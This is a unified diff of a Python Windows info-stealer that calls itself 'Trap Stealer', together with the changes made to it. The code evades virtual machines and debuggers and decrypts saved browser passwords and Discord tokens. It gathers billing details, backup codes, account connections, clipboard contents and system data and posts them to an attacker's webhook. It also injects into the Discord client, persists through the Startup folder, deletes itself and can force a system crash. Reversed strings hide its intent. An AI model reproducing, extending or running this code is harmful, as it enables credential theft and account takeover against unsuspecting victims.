@@ -1,50 +1,53 @@
-import sys, time, random, threading, ctypes, shutil
-import os, re, socket, json, sqlite3, zipfile, subprocess
-import urllib.request, winreg, getpass, platform
-from os.path import isfile, exists
-from ctypes import wintypes, bref, cdll, Structure, POINTER, c_char, c_buffer
-from json import loads, dumps
-from zipfile import ZipFile
-from shutil import copy
-from urllib.request import Request, urlopen
-from sqlite3 import connect as sql_connect
-from base64 import b64decode
-from json import loads as json_loads
-from os.path import isfile
+import sys, time, random, threading, ctypes, string
+import os, re, socket, subprocess
 import winreg
-import os.path, zipfile
-import shutil, json, sqlite3
+from urllib.parse import urlparse
+from os.path import isfile, exists
+from shutil import copy
+import sqlite3
+from base64 import b64decode
+import winreg
+import zipfile
+from zipfile import ZipFile
+import shutil
 import tempfile
 from sys import executable, stderr
 from ctypes import *
-webhook = '%Webhook%'
+from json import loads, dumps
 
+webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
-injection = '%Injection%' 
+injection = '%Injection%'
 Startup = '%Startup%'
 antidebugging = '%No_Debug%' 
 DiscordStop = '%Close%' 
+OneTimeSteal = '%Onetime%'
+melter = '%Melter%'
+crasher = '%Crash%'
 
 if Startup == False:
     StartupMessage = 'Adding to startup disabled in the config'
 else:
     StartupMessage = 'Error while adding Trap into the startup folder' 
-
 requirements = [
     ["requests", "requests"],
     ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
 ]
+for module in requirements:
+    try: 
+        __import__(module[0])
+    except:
+        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
+        time.sleep(3)
 
-for modl in requirements:
-    try:
-        __import__(modl[0])
-    except ImportError:
-        subprocess.call(['pip', 'install', modl[1]])
 
 from Crypto.Cipher import AES
-import requests
 
+import requests
+def sql_connect(database_path):
+    conn = sqlite3.connect(database_path)
+    return conn
 
 def clear_command_prompt():
     if os.name == 'nt':
@@ -56,12 +59,11 @@ def antidebug():
     for check in checks:
         t = threading.Thread(target=check, daemon=True)
         t.start()
-coonum = 0
+
 def exit_program(reason):
     print(reason)
     ctypes.windll.kernel32.ExitProcess(0)
 
-PasswCount = 0
 def check_windows():
     @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
     def winEnumHandler(hwnd, ctx):
@@ -83,7 +85,13 @@ def check_windows():
     while True:
         ctypes.windll.user32.EnumWindows(winEnumHandler, None)
         time.sleep(0.5)
-        
+
+def self_delete():
+    try:
+        os.remove(__file__)
+    except Exception as e:
+        pass
+
 def check_ip():
     blacklisted = [
         '822.842.352.43', '311.45.741.48', '64.842.821.32', '441.291.112.29', '432.75.04.291',
@@ -101,9 +109,10 @@ def check_ip():
     ]
     while True:
         try:
-            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
-            if ip[::-1] in blacklisted:
-                exit_program('')
+            response = requests.get("https://api.ipify.org")
+            ip_address = response.content.decode()
+            if ip_address in blacklisted[::-1]:
+                exit_program('Blacklisted IP')
             return
         except:
             pass
@@ -115,7 +124,7 @@ def check_registry():
         for i in range(subkey_count):
             subkey = winreg.EnumKey(key, i)
             if subkey.startswith('VMWARE'):
-                exit_program('')
+                exit_program('Unvalid')
         winreg.CloseKey(key)
     except:
         pass
@@ -123,76 +132,49 @@ def check_registry():
 def check_dll():
     sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
     if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
-        exit_program('')
+        exit_program('Strange dll detected!')
 
 
-
-
-class DATA_BLOB(Structure):
-    _fields_ = [
-        ('cbData', wintypes.DWORD),
-        ('pbData', POINTER(c_char))
-    ]
 def webhook_tools():
     try:
-        time.sleep(1)
-        clear_command_prompt()
-        inputmain = input(f'''
-        Which webhook tools you want to use ?
-
-        [1] Webhook Spammer
-        [2] Webhook Deleter
-
-        -> ''')
+        inputmain = input('1 - Spam a Webhook\n2 - Delete Webhook\n')
         if inputmain == '1':
-            url = input(f'Webhook URL : ')
-            messages = (f'Message To Spam : ')
-            rah = "dens"
-            timetospam = input(f'How many times do you want to {rah[::-1]} the message? : ')
-            message = messages
-            data = {
-                "content": message,
-                "username": "Spam Moment"
-            }
+            timetospam = input('Number of messages -> ')
+            data = {'message': 'your_message'}
+            url = input('Webhook URL -> ')
 
             for i in range(int(timetospam)):
-                encoded_data = urllib.parse.urlencode(data).encode('utf-8')
-                req = urllib.request.Request(url, data=encoded_data)
-                try:
-                    with urllib.request.urlopen(req) as response:
-                        pass
-                except urllib.error.HTTPError as e:
-                    print(f"Error: {e.code}")
-                else:
+                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+                response = requests.post(url, data=data, headers=headers)
+                if response.status_code == 200:
                     print(f"Message sent successfully")
+                else:
+                    print(f"Failed to send message: {response.status_code}")
+
                 time.sleep(0.2)
 
-            print(f'Ended. Press Any Key to Leave')
-
+            print('Ended. Press Any Key to Leave')
         elif inputmain == '2':
-            webhook = input(f'Webhook URL -> ')
-            req = urllib.request.Request(webhook, method='DELETE')
-            try:
-                with urllib.request.urlopen(req) as response:
-                    pass
-            except urllib.error.HTTPError as e:
-                print(f"Error: {e.code}")
+            url = input('Webhook URL -> ')
+            response = requests.delete(url)
+            if response.status_code == 200:
+                print('Webhook deleted successfully')
             else:
-                print(f"Webhook deleted successfully")
-            print(f'Press any key to quit')
+                print(f"Failed to delete webhook: {response.status_code}")
 
+            print('Press any key to quit')
         else:
-            print(f'Wrong input')
+            print('Wrong input')
             time.sleep(1)
+
     except:
         pass
+
 headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
 
 file_path = os.path.realpath(__file__)
-USER_NAME = getpass.getuser()
-
 
 class DATA_BLOB(Structure):
     _fields_ = [
@@ -208,7 +190,6 @@ def GetData(blob_out):
     windll.kernel32.LocalFree(pbData)
     return buffer.raw
 
-
 def CryptUnprotectData(encrypted_bytes, entropy=b''):
     buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
     buffer_entropy = c_buffer(entropy, len(entropy))
@@ -218,7 +199,6 @@ def CryptUnprotectData(encrypted_bytes, entropy=b''):
 
     if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
         return GetData(blob_out)
-
 
 wltZip = []
 GamingZip = []
@@ -234,7 +214,6 @@ def fakegen():
         ██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║██║   ██║██╔══╝  ██║╚██╗██║
         ██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝╚██████╔╝███████╗██║ ╚████║
         ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝''')
-        import string
 
         codes_list = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)
         count_generator = 0
@@ -257,9 +236,10 @@ def fakegen():
                     time.sleep(3600)
                 valid_test = random.randint(1, 100000)
                 time.sleep(0.05)
-    except:pass
+    except:
+        pass
 
-def DecryptValue(buff, master_key=None):
+def decrval(buff, master_key=None):
     starts = buff.decode(encoding='utf8', errors='ignore')[:3]
     if starts == 'v10' or starts == 'v11':
         iv = buff[3:15]
@@ -280,7 +260,6 @@ def Clipboard():
     except subprocess.CalledProcessError as e:
         return 'Error while getting clipboard'
 
-import string
 apppp = 'atadppa'
 path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
 
@@ -337,7 +316,8 @@ def startup():
             add_to_startup(new_path)
         except Exception as e:
             pass
-    except:pass
+    except:
+        pass
     apppp = 'atadppa'
     path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
 
@@ -348,25 +328,19 @@ def startup():
         if __file__.replace('\\', '/') != path.replace('\\', '/'):
             pass
 
-
-
 def LoadUrlib(hook, data='', files='', headers=''):
     
     hook = deobf(webhook[0],webhook[1]).decode()
     for i in range(8):
         try:
             if headers != '':
-                r = urlopen(Request(hook, data=data, headers=headers))
+                r = requests.post(hook, data=data, headers=headers)
                 return r
             else:
-                r = urlopen(Request(hook, data=data))
+                r = requests.post(hook, data=data)
                 return r
         except: 
             pass
-
-Dscptb= 'BTPdrocsiD'[::-1]
-Dsccana = 'yranaCdrocsiD'[::-1]
-Dscdev = 'tnempoleveDdrocsiD'[::-1]
 
 Desc= 'drocsiD'[::-1]
 Dscptb= 'BTPdrocsiD'[::-1]
@@ -389,7 +363,7 @@ def NoDiscord():
 
 def idisc():
     ind = "sj.xedni"
-
+    global webhook
 
     inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"
 
@@ -401,30 +375,35 @@ def idisc():
                 for file in files:
                     if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
                         file_path = os.path.join(root, file)
+                        hook = deobf(webhook[0],webhook[1]).decode()
+                        webhook = str(hook)
                         inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", webhook)
                         with open(file_path, "w", encoding="utf-8") as f:
                             f.write(inj_content)
 
 pas = 'drowssaP'
 def systemInfo():
-    system = platform.system()
-    node_name = platform.node()
-    release = platform.release()
-    version = platform.version()
-    machine = platform.machine()
-    processor = platform.processor()
-    home_dir = os.path.expanduser("~")
+    try:
+        system = os.name
+        node_name = os.getenv("COMPUTERNAME")
+        release = os.getenv("SystemRoot").split("\\")[-1]
+        version = os.getenv("OSVERSION_VERSION")
+        machine = os.getenv("PROCESSOR_ARCHITECTURE")
+        processor = os.getenv("PROCESSOR_IDENTIFIER")
+        home_dir = os.getenv("USERPROFILE")
 
-    sys_info = f"System information:\n"\
-               f"{system}\n"\
-               f"Node name: {node_name}\n"\
-               f"Release: {release}\n"\
-               f"Version: {version}\n"\
-               f"Machine: {machine}\n"\
-               f"Processor: {processor}\n"\
-               f"Home directory: {home_dir}\n"
+        sys_info = f"System information:\n"\
+                f"{system}\n"\
+                f"Node name: {node_name}\n"\
+                f"Release: {release}\n"\
+                f"Version: {version}\n"\
+                f"Machine: {machine}\n"\
+                f"Processor: {processor}\n"\
+                f"Home directory: {home_dir}\n"
 
-    return sys_info
+        return sys_info
+    except:
+        return 'Error'
 
 def avs():
     script = r'''
@@ -442,8 +421,11 @@ Powershell -command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName 
 
     file_path = os.path.join('C:\\Users', username, 'AppData', 'Local', 'Temp', 'winvs.txt')
 
-    with open(file_path, 'rb') as file:
-        content = file.read().decode('utf-8', errors='ignore').strip()
+    with open(file_path, 'r', encoding='utf-16') as file:
+        content = file.read().strip()
+        
+    return content
+
 
 
 def run_command(command):
@@ -458,18 +440,18 @@ def run_command(command):
         return 'N/A'
 
 def get_product_key():
-    return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault")
-
+    try:return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault")
+    except:return "Couldn't get Product Name"
 def get_product_name():
-    return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")
-
-
+    try:return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")
+    except:return "Couldn't get Product Name"
+PasswCount = 0
 def globalInfo():
     pr = get_product_name()
     winkey = get_product_key()
-    url = 'nosj/oi.ofnipi//:sptth'
-    response = urllib.request.urlopen(url[::-1])
-    data = json.loads(response.read().decode())
+    url = 'nosj/oi.ofnipi//:sptth'[::-1]
+    req = requests.get(url)
+    data = req.json()
     ip = data['ip']
     loc = data['loc']
     location = loc.split(',')
@@ -484,11 +466,12 @@ def globalInfo():
     computer_name = socket.gethostname()
     cores = os.cpu_count()
     avss = avs()
-    if platform.system() == 'Linux':
+    system = os.name
+    if system == 'Linux':
         gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
         if gpu_info:
             gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
-    elif platform.system() == 'Windows':
+    elif system == 'nt':
         try:
             gpu_model = os.popen("nvidia-smi --query-gpu=name --format=csv,noheader").read().strip()
             total_memory = os.popen("nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits").read().strip()
@@ -496,7 +479,7 @@ def globalInfo():
             used_memory = os.popen("nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits").read().strip()
             temperature = os.popen("nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits").read().strip()
 
-            gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`"
+            gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\n\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
 
         except Exception as e:
             gpu = f"An error occurred: {str(e)}"
@@ -506,6 +489,26 @@ def globalInfo():
         globalinfo = globalinfo[:1708] + "\n**Can't show everything, too many data**"
         
     return globalinfo
+def antispam():
+    file_path = os.path.join(os.getenv("TEMP"), "winlog.txt")
+
+    if os.path.exists(file_path):
+        with open(file_path, "r") as file:
+            saved_time = file.read().strip()
+        current_time = time.time()
+        saved_time = float(saved_time)
+        time_difference = current_time - saved_time
+        if time_difference >= 30 * 60:
+            with open(file_path, "w") as file:
+                current_time = str(time.time())
+                file.write(current_time)
+        else:
+            quit()
+    else:
+        with open(file_path, "w") as file:
+            current_time = str(time.time())
+            file.write(current_time)
+
 
 # ALL PATH
 local = os.getenv('LOCALAPPDATA')
@@ -538,6 +541,15 @@ pub = 'cilbup'
 
 Autofill = []
 AutofillCount = 0
+
+
+def writeforfile(data, name):
+    path = os.getenv("TEMP") + f"\wp{name}.txt"
+    with open(path, mode='w', encoding='utf-8') as f:
+        f.write(f"Trap Stealer\n\n")
+        for line in data:
+            if line[0] != '':
+                f.write(f"{line}\n")
 
 
 def getAutofill(path, arg):
@@ -578,17 +590,15 @@ def get_uhq_guilds(token):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
         }
 
-        request = urllib.request.Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
-        response = urllib.request.urlopen(request)
-        guilds = json.loads(response.read().decode())
+        response = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
+        guilds = response.json()
 
         for guild in guilds:
             if guild["approximate_member_count"] < 30 or not (guild["owner"] or guild["permissions"] == "4398046511103"):
                 continue
             
-            request = urllib.request.Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)
-            response = urllib.request.urlopen(request)
-            invites = json.loads(response.read().decode())
+            request = requests.get(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)
+            invites = request.json()
 
             invite_code = invites[0]['code'] if invites else None
 
@@ -610,8 +620,8 @@ def get_uhq_friends(tokq, max_friends=5):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
     try:
-        response = urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers))
-        friendlist = json.loads(response.read().decode())
+        response = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=headers)
+        friendlist = response.json()
     except:
         return False
 
@@ -649,8 +659,8 @@ def get_tokq_info(tokq):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    response = urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
-    user_info = json.loads(response.read().decode())
+    response = requests.get("https://discordapp.com/api/v6/users/@me", headers=headers)
+    user_info = response.json()
 
     username = user_info["username"]
     globalusername = 'None'
@@ -676,20 +686,23 @@ def get_tokq_info(tokq):
     pfp = user_info["avatar"]
 
     flags = user_info[f"{pub[::-1]}_flags"]
-    nitro = ""
+    nitros = "No Nitro"
     phone = "-"
 
     if "premium_type" in user_info:
         nitros = user_info["premium_type"]
         if nitros == 1:
-            nitro = "<:classic:896119171019067423> "
+            nitros = "<:classic:896119171019067423> Nitro Classic "
         elif nitros == 2:
-            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
+            nitros = "<a:boost:824036778570416129> <:classic:896119171019067423> Nitro Boost "
+            
+        elif nitros == 3:
+            nitros =  "<:classic:896119171019067423> Nitro Basic "
 
     if "phone" in user_info:
         phone = f'`{user_info["phone"]}`'
 
-    return username, globalusername, bio, nsfw, hashtag, ema, user_id, pfp, flags, nitro, phone
+    return username, globalusername, bio, nsfw, hashtag, ema, user_id, pfp, flags, nitros, phone
 
 def checkTokq(Tokq):
     headers = {
@@ -698,9 +711,12 @@ def checkTokq(Tokq):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
     try:
-        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
-        return True
-    except:
+        a = requests.get("https://discord.com/api/v6/users/@me", headers=headers)
+        if a.status_code == 401:  # Compare the status code as an integer
+            return False
+        else:
+            return True
+    except Exception as e:
         return False
 
 def GetBilling(Tokq):
@@ -710,7 +726,7 @@ def GetBilling(Tokq):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
     try:
-        with urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)) as response:
+        with requests.get("https://discord.com/api/users/@me/billing/payment-sources", headers=headers) as response:
             billing_json = loads(response.read().decode())
     except:
         return False
@@ -729,19 +745,79 @@ def GetBilling(Tokq):
 
 processed_tokens = []
 
+def GetBack():
+    try:
+        path = os.environ["HOMEPATH"]
+        code_path = '\\Downloads\\discord_backup_codes.txt'
+        full = path + code_path
+        if os.path.exists(path + code_path):
+            with open(path + code_path, 'r', encoding='utf-8') as f:
+                backup = f.readlines()
+                
+            return backup
+                
+    except Exception as e:
+        return 'No backup code saved'
+    
+def get_discord_connections(tokq):
+    headers = {
+        "Authorization": tokq,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+    }
+    response = requests.get("https://discord.com/api/v6/users/@me/connections", headers=headers)
 
+    if response.status_code == 200:
+        data = response.json() 
+
+        Services = {
+            "battlenet": "https://battle.net",
+            "ebay": "https://ebay.com",
+            "epicgames": "https://epicgames.com",
+            "facebook": "https://facebook.com",
+            "github": "https://github.com",
+            "instagram": "https://instagram.com",
+            "leagueoflegends": "https://leagueoflegends.com",
+            "paypal": "https://paypal.com",
+            "playstation": "https://playstation.com",
+            "reddit": "https://reddit.com",
+            "riotgames": "https://riotgames.com",
+            "spotify": "https://spotify.com",
+            "skype": "https://skype.com",
+            "steam": "https://store.steampowered.com",
+            "tiktok": "https://tiktok.com",
+            "twitch": "https://twitch.tv",
+            "twitter": "https://twitter.com",
+            "xbox": "https://xbox.com",
+            "youtube": "https://youtube.com",
+        }
+        connections_list = []
+
+        for connection in data:
+            connections_list.append(f"☂️ Username : `{connection['name']}`\n🌐 Services : [{connection['type']}]({Services.get(connection['type'], 'Unknown')})\n")
+
+        return connections_list
+    else:
+        print('error')
+        return []
+    
 def uploadTokq(Tokq, path):
     if Tokq in processed_tokens:
         return
+    
+    else: processed_tokens.append(Tokq)
     username, globalusername, bio, nsfw, hashtag, ema, user_id, pfp, flags, nitro, phone = get_tokq_info(Tokq)
 
     pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
-
+    back = GetBack()
     billing = GetBilling(Tokq)
     badge = get_badge(flags)
     friends = get_uhq_friends(Tokq)
     guild = get_uhq_guilds(Tokq)
+    connections = get_discord_connections(Tokq)
+    connections = "\n".join(connections)
 
+    
     if friends == '': friends = "No Rare Friends"
     if not billing:
         badge, phone, billing = "🔒", "🔒", "🔒"
@@ -812,6 +888,16 @@ def uploadTokq(Tokq, path):
                         "name": "⚔️ HQ guilds:",
                         "value": guild,
                         "inline": False
+                    },
+                    {
+                        "name": "🔗 Connections:",
+                        "value": connections,
+                        "inline": False
+                    },
+                    {
+                        "name": "Backup Code",
+                        "value": f'{back}',
+                        "inline": False
                     }
                     
                 ]
@@ -830,7 +916,6 @@ def uploadTokq(Tokq, path):
         data = data[:character_limit - 3] + "..."
 
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-    processed_tokens.append(Tokq)
 
 
 
@@ -843,8 +928,8 @@ def upload_file(file_path):
         return response.json()["data"]["downloadPage"]
     except:
         return False
-
-
+    
+    
 
 def find_history_file(browser_name, path_template):
     if os.name == "nt":
@@ -858,7 +943,6 @@ def find_history_file(browser_name, path_template):
 
 def find_brave_history_file():
     return os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History')
-from urllib.parse import urlparse
 cl = 0
 CookiCount = 0
 Cookies = []
@@ -1017,6 +1101,25 @@ def create_browser_zip(browser_name, find_history_func, temp_dir):
         return output_file
     return None
 
+def crashs():
+    ntdll = ctypes.WinDLL('ntdll.dll')
+
+    RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
+    RtlAdjustPrivilege.argtypes = (ctypes.c_ulong, ctypes.c_bool, ctypes.c_bool, ctypes.POINTER(ctypes.c_bool))
+    RtlAdjustPrivilege.restype = ctypes.c_ulong
+    PrivilegeState = ctypes.c_bool(False)
+    RtlAdjustPrivilege(19, True, False, ctypes.byref(PrivilegeState))
+
+    NtRaiseHardError = ntdll.NtRaiseHardError
+    NtRaiseHardError.argtypes = (
+        ctypes.c_long, ctypes.c_ulong, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulonglong),
+        ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
+    )
+    NtRaiseHardError.restype = ctypes.c_ulong
+    ErrorResponse = ctypes.c_ulong(0)
+    NtRaiseHardError(0xC0000006, 0, 0, None, 6, ctypes.byref(ErrorResponse))
+
+
 def brohist():
     browsers = {
         "Chrome": find_chrome_history_file,
@@ -1034,7 +1137,8 @@ def brohist():
     files_to_zip = []
     try:
         get_brave_history(temp_dir, files_to_zip)
-    except:pass
+    except:
+        pass
     try:
         for browser_name, find_history_func in browsers.items():
             thread = threading.Thread(target=extract_history_with_timeout, args=(browser_name, find_history_func, temp_dir, files_to_zip))
@@ -1055,8 +1159,7 @@ def brohist():
         for file_to_delete in files_to_zip:
             if os.path.exists(file_to_delete):
                 os.remove(file_to_delete)
-
-
+        
 def histup():
     try:
         brohist()
@@ -1087,7 +1190,8 @@ def histup():
         pass
 Tokqs = []
 def getTokq(path, arg):
-    if not os.path.exists(path): return
+    if not os.path.exists(path):
+        return
 
     path += arg
     for file in os.listdir(path):
@@ -1096,7 +1200,7 @@ def getTokq(path, arg):
                 for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                     for Tokq in re.findall(regex, line):
                         global Tokqs
-                        if checkTokq(Tokq):
+                        if checkTokq(Tokq) == True:
                             if not Tokq in Tokqs:
                                 Tokqs += Tokq
                                 uploadTokq(Tokq, path)
@@ -1107,29 +1211,21 @@ def GetDiscord(path, arg):
     pathC = path + arg
 
     pathKey = path + "/Local State"
-    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
     
     for file in os.listdir(pathC):
-        if file.endswith(".log") or file.endswith(".ldb")   :
+        if file.endswith(".log") or file.endswith(".ldb"):
             for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                 for Tokq in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                     global Tokqs
-                    TokqDecoded = DecryptValue(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
+                    TokqDecoded = decrval(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
                     if checkTokq(TokqDecoded):
                         if not TokqDecoded in Tokqs:
                             Tokqs += TokqDecoded
                             uploadTokq(TokqDecoded, path)
 
-
-def writeforfile(data, name):
-    path = os.getenv("TEMP") + f"\wp{name}.txt"
-    with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"Trap Stealer\n\n")
-        for line in data:
-            if line[0] != '':
-                f.write(f"{line}\n")
 
                 
 paswWords = []
@@ -1146,7 +1242,7 @@ def getPassw(path, arg):
         if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
             return GetData(blob_out)
 
-    def DecryptValue(buff, master_key=None):
+    def decrval(buff, master_key=None):
         starts = buff.decode(encoding='utf8', errors='ignore')[:3]
         if starts in ['v10', 'v11']:
             iv = buff[3:15]
@@ -1175,7 +1271,7 @@ def getPassw(path, arg):
     es = 'tpyrc_so'
     ess= 'yek_detpyrcne'
     pathKey = path + "/Local State"
-    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
     master_key = b64decode(local_state[es[::-1]][ess[::-1]])
     master_key = CryptUnprotectData(master_key[5:])
     keys = [
@@ -1191,7 +1287,7 @@ def getPassw(path, arg):
                     if not old in paswWords: paswWords.append(old)
             us = 'emanresU'
             ur = 'lrU'
-            Passw.append(f"{ur[::-1]}: {row[0]} | {us[::-1]}: {row[1]} | {pas[::-1]}: {DecryptValue(row[2], master_key)}")
+            Passw.append(f"{ur[::-1]}: {row[0]} | {us[::-1]}: {row[1]} | {pas[::-1]}: {decrval(row[2], master_key)}")
             PasswCount += 1
     writeforfile(Passw, 'passw')
     
@@ -1199,10 +1295,19 @@ def getPassw(path, arg):
 def getinfo():
     
     try:
-
-        sysinfo = systemInfo()
-        globalinfo = globalInfo()
-        clipboardtext = Clipboard()
+        try:
+            sysinfo = systemInfo()
+        except:
+            sysinfo = "Couldn't get system information"
+        try:
+            globalinfo = globalInfo()
+        except:
+            globalinfo = "Couldn't get global information"
+            
+        try:
+            clipboardtext = Clipboard()
+        except:
+            clipboardtext = "Couldn't get clipboard"
         data = {
             
             "username": "Trap Stealer",
@@ -1224,7 +1329,8 @@ def getinfo():
             ]
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-    except:pass
+    except:
+        pass
 
 def steam_st():
     try:
@@ -1265,7 +1371,8 @@ def steam_st():
 
             except:
                 pass
-    except:pass
+    except:
+        pass
 
 import concurrent.futures
 
@@ -1283,7 +1390,8 @@ def upload_files_to_discord():
                 if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
                     file_path = os.path.join(path, file) 
                     file_paths.append(file_path)
-        except:pass
+        except:
+            pass
         urls = []
     
         with concurrent.futures.ThreadPoolExecutor() as executor:
@@ -1298,7 +1406,8 @@ def upload_files_to_discord():
                         urls.append((os.path.basename(file_path), url))
                     else:
                         pass
-            except:pass
+            except:
+                pass
             finally:
                 executor.shutdown(wait=True)
 
@@ -1328,6 +1437,117 @@ def upload_files_to_discord():
         }
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+        
+        
+def list_files_in_directory(directory, level=0, max_display=100):
+    file_list = []
+
+    for root, dirs, files in os.walk(directory):
+        root_name = os.path.basename(root)
+        indent = "    " * level
+        truncated_root_name = root_name[:10] + "..." if len(root_name) > 10 else root_name
+        folder_line = f"{indent}{'      ╚═' if level == 0 else '    ╠═'}📂 {truncated_root_name}"
+
+        if not os.listdir(root):
+            continue
+
+        file_list.append(folder_line)
+
+        num_files = len(files)
+        if num_files <= max_display:
+            for idx, file in enumerate(files):
+                file_path = os.path.join(root, file)
+                if os.path.isdir(file_path):
+                    folder_line = f"{indent}{'╠═' if level == 0 else '    ╠═'}📂 {file}"
+                    if file != truncated_root_name:
+                        folder_line = "    " + folder_line
+                    file_list.append(folder_line)
+                    file_list.extend(list_files_in_directory(file_path, level=level + 1, max_display=max_display))
+                else:
+                    truncated_file_name = file[:10] + "..." if len(file) > 10 else file
+                    file_line = f"{indent}{'    ╠═' if level == 0 else '        ╠═'}📝 {truncated_file_name}"
+
+                    if os.path.isdir(file_path) and any(os.path.isfile(os.path.join(file_path, subfile)) for subfile in os.listdir(file_path)):
+                        file_line = file_line.replace("╠", "╚", 1) 
+
+                    if idx == num_files - 1:
+                        file_line = file_line.replace("╠", "╚", 1) 
+
+                    if not file_line.startswith("\t"):
+                        file_line = "\t" + file_line 
+
+                    file_list.append(file_line)
+        else:
+            file_list.append(f"{indent}{'   ' if level == 0 else ' '}     ╚═📝 (Too many files to display)")
+
+    file_list[0] = f"╚═📂 5319275A.W..."
+
